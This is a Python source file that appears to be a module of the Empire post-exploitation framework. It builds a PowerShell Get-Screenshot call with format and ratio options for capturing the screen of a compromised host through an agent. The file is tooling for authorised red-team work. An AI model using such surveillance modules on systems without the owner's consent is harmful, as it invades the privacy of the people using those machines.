from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        if params["Ratio"]:
            if params["Ratio"] != "0":
                module.output_extension = "jpg"
            else:
                params["Ratio"] = ""
                module.output_extension = "png"
        else:
            module.output_extension = "png"

        script_end = "\nGet-Screenshot"
        for option, values in params.items():
            if option.lower() != "agent" and values and values != "":
                if values.lower() == "true":
                    # if we're just adding a switch
                    script_end += " -" + str(option)
                else:
                    script_end += " -" + str(option) + " " + str(values)

        return script, script_end
